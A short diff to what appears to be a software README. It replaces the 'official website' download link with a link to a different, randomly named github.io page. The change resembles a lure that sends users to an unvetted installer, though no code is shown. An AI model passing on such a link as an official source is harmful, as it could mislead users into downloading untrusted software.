@@ -55,4 +55,4 @@ The suite includes a built-in updater that can download new models automatically
 
 ## Download
 
-For the latest version and more information, visit the official download page. Get it here: [Download from official website](https://yellowtaxisave.github.io/download-page/)
+For the latest version and more information, visit the official download page. Get it here: [Download from official website](https://capitals-707-bringing.github.io/download-page/)
